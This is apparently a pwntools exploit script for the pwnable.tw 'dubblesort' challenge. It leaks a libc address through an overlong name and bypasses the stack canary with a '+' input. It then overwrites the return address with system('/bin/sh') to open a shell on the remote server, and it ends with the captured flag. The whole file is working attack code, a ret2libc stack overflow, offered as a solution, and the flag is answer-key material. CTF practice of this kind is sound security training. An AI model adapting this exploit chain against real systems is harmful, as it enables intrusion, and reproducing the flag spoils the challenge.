from pwn import *

local = 0
debug = 0

if local:
	s = process('./dubblesort_patched')
	#s = process(['./ld-2.23.so', './dubblesort'], env = { 'LD_PRELOAD' : './libc-2.23.so' })
	leak = 28
	raw_input('DEBUG')
	if debug:
		gdb.attach(s, gdbscript='''
			brva 0x00000A1D
			brva 0x00000B02
			c
		''')
else:
	s = remote('chall.pwnable.tw', 10101)
	leak = 24

libc = ELF('libc_32.so.6')
offset = 0x1b0000

s.sendlineafter(b'What your name :', b'A' * leak)
s.recvline()
libc.address = (int.from_bytes(s.recv(3), byteorder = 'little', signed = False) << 8) - offset

log.info('[*] libc base: 0x%x' % libc.address)

s.sendlineafter(b'sort :', b'35')

rop = ['0' for i in range(24)]
rop += ['+']
rop += [str(libc.symbols['system']) for i in range(9)]
rop += [str(next(libc.search(b'/bin/sh')))]

for i in range(35):
	s.sendlineafter(b'number : ', bytes(rop[i], 'utf-8'))

s.interactive()
#FLAG{Dubo_duBo_dub0_s0rttttttt}
